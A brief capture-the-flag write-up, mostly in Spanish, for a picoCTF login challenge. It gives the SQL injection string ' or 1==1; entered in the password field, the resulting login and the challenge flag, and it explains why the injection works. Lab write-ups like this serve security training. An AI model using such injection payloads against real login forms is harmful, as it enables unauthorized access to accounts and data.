## Objetivo 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
## Solución  
```bash
' or 1==1;

# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```
## Notas Adicionales 
el sitio web usa una forma de verificar los loggins mediante sql por lo que podemos ingresar en el campo de contrasena: `' or 1==1;`
lo cual siempre es verdadero y a esto se le conoce como inyeccion SQL.
### Referencias

